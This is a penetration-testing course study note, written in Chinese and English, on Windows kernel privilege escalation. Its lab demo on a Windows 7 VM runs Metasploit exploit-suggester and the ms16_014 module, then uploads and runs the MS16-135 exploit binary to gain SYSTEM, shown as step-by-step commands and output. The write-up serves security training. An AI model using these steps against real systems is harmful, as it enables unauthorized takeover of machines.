---
layout: post
title: "Windows Kernel Exploits"
date: "2022-09-19"
author: "r3kind1e"
header-img: "img/post-bg-Penetration Testing Student.png"
catalog:    true
tags: 
    - Penetration Testing Student v2
    - Host & Network Penetration Testing
    - System/Host Based Attacks
---

# Windows Kernel Exploits（Windows 内核漏洞利用）
## 权限提升
权限提升是利用系统中的漏洞或错误配置将权限从一个用户提升到另一个用户的过程，通常是在系统上具有管理或root访问权限的用户。

权限升级是攻击生命周期的重要元素，也是渗透测试整体成功的主要决定因素。

在目标系统上获得初步立足点后，您将需要提升您的权限以执行需要管理权限的任务和功能。

权限提升在渗透测试过程中的重要性不能被夸大或忽视。 发展你的特权提升技能将使你成为一名优秀的渗透测试员。

## Windows内核
内核是一种计算机程序，它是操作系统的核心，可以完全控制系统上的所有资源和硬件。 它充当硬件和软件之间的转换层，并促进这两层之间的通信。

Windows NT 是与所有版本的 Microsoft Windows 一起预先打包的内核，并作为传统内核运行，但基于用户设计理念的一些例外情况。 它由两种主要的操作模式组成，这些模式决定了对系统资源和硬件的访问：

用户模式 - 在用户模式下运行的程序和服务对系统资源和功能的访问受限。

内核模式 - 内核模式可以不受限制地访问系统资源和功能，并增加了管理设备和系统内存的功能。

## Windows 内核利用
Windows 上的内核利用通常会针对 Windows 内核中的漏洞来执行任意代码，以便运行特权系统命令或获取系统 shell。

此过程将根据目标 Windows 的版本和使用的内核漏洞而有所不同。

Windows 系统上的权限提升通常遵循以下方法：

识别内核漏洞

下载、编译和传输内核漏洞到目标系统。

## 工具与环境
Windows-Exploit-Suggester - 此工具将目标补丁级别与 Microsoft 漏洞数据库进行比较，以检测目标上潜在的缺失补丁。 如果存在可用于丢失公告的公共漏洞利用和 Metasploit 模块，它还会通知用户。

Github： https://github.com/AonCyberLabs/Windows-Exploit-Suggester

Windows-Kernel-Exploits - 按 CVE 排序的 Windows 内核漏洞利用集合。

https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-135

注意：本视频中演示的技术是在 Windows 7 SP1 VM 上执行的。

# Demo: Windows Kernel Exploits
```
msf6 > sessions

Active sessions
===============

Id  Name    Type                    Information                     Connection
--  ----    ----                    -----------                     ----------
2           powershell windows      Accountant @ WIN7-PC            10.10.10.10:4444 -> 10.10.10.7:49166 (10.10.10.7)
3           meterpreter x64/windows Win7-PC\Accountant @ WIN7-PC    10.10.10.10:4433 -> 10.10.10.7:49167 (10.10.10.7)
```

```
msf6 > sessions 3
meterpreter > getuid
meterpreter > getprivs
meterpreter > getsystem
```

```
msf6 > search suggester
msf6 > use post/multi/recon/local_exploit_suggester
msf6 post(multi/recon/local_exploit_suggester) > show options
msf6 post(multi/recon/local_exploit_suggester) > sessions
msf6 post(multi/recon/local_exploit_suggester) > run
```

Search for `ms10_092_schelevator` on Google:

[Windows Escalate Task Scheduler XML Privilege Escalation](https://www.rapid7.com/db/modules/exploit/windows/local/ms10_092_schelevator/)

Windows 升级任务计划程序 XML 权限升级

该模块利用了 Stuxnet 利用的 Task Scheduler 2.0 XML 0day。在处理任务文件时，Windows 任务计划程序仅使用 CRC32 校验和来验证文件是否未被篡改。此外，在默认配置中，普通用户可以读取和写入他们创建的任务文件。通过修改任务文件并创建 CRC32 冲突，攻击者可以使用 SYSTEM 权限执行任意命令。注意：感谢 webDEViL 提供有关禁用/启用的信息。

Search for `ms16_014_wmi_recv_notif` on Google:

[Windows WMI Receive Notification Exploit](https://www.rapid7.com/db/modules/exploit/windows/local/ms16_014_wmi_recv_notif/)

Windows WMI 接收通知漏洞利用

该模块利用了 ntoskrnl 的 WMI 子系统中未初始化的堆栈变量。该模块已在易受攻击的 Windows 7 SP0 x64 和 Windows 7 SP1 x64 版本上进行了测试。

```
msf6 post(multi/recon/local_exploit_suggester) > use exploit/windows/local/ms16_014_wmi_recv_notif
msf6 post(multi/recon/local_exploit_suggester) > set SESSION 3
msf6 post(multi/recon/local_exploit_suggester) > sessions
msf6 post(multi/recon/local_exploit_suggester) > set LPORT 4422
msf6 post(multi/recon/local_exploit_suggester) > exploit
meterpreter > getuid
meterpreter > 
background session 4? [y/N]
msf6 post(multi/recon/local_exploit_suggester) > sessions

Active sessions
===============

Id  Name    Type                    Information                     Connection
--  ----    ----                    -----------                     ----------
2           powershell windows      Accountant @ WIN7-PC            10.10.10.10:4444 -> 10.10.10.7:49166 (10.10.10.7)
3           meterpreter x64/windows Win7-PC\Accountant @ WIN7-PC    10.10.10.10:4433 -> 10.10.10.7:49167 (10.10.10.7)
4           meterpreter x64/windows NT AUTHORITY\SYSTEM @ WIN7-PC   10.10.10.10:4422 -> 10.10.10.7:49183 (10.10.10.7)
```

Perform manual privilege escalation:

[Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)

This tool compares a targets patch levels against the Microsoft vulnerability database in order to detect potential missing patches on the target. It also notifies the user if there are public exploits and Metasploit modules available for the missing bulletins.



```
msf6 post(multi/recon/local_exploit_suggester) > session 3
meterpreter > getuid
Server username: Win7-PC\Accountant
meterpreter > shell

C:\Temp>systeminfo

Host Name:          WIN7-PC
OS Name:            Microsoft Windows 7 Ultimate
OS Version:         6.1.7601 Service Pack 1 Build 7601
...
Hotfix(s):          2 Hotfix(s) Installed.
                    [01]: KB2534111
                    [02]: KB976902
C:\Temp > ^C
Terminate channel 12? [y/N]
meterpreter > 
```

Copy these information.

Open up a new terminal, paste copied information:

```
cd Desktop
vim win7.txt
ls
cd Windows-Enum/Windows-Exploit-Suggester
ls
./windows-exploit-suggester.py --update
./windows-exploit-suggester.py --database 2021-12-26-mssb.xls --systeminfo ~/Desktop/win7.txt
```

The exploits listed at the very top once have higher chance of successfully been exploited.

Search for `MS16-135` on Google:

[windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

[MS16-135 x64 Universal](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-135)

Download `41015.exe`, transfer this executable onto the target system, and execute it, then I should have elevated privileges.

Use the meterpreter access to upload the executetable onto the `Temp` direcotory within the Windows's :

```
meterpreter > cd C:\\
meterpreter > ls
meterpreter > cd Temp\\
meterpreter > ls
meterpreter > upload ~/Downloads/41015.exe
meterpreter > shell

C:\Temp>dir
C:\Temp>.\41015.exe
C:\Temp>.\41015.exe 7

C:\Temp>whoami
nt authority\system
```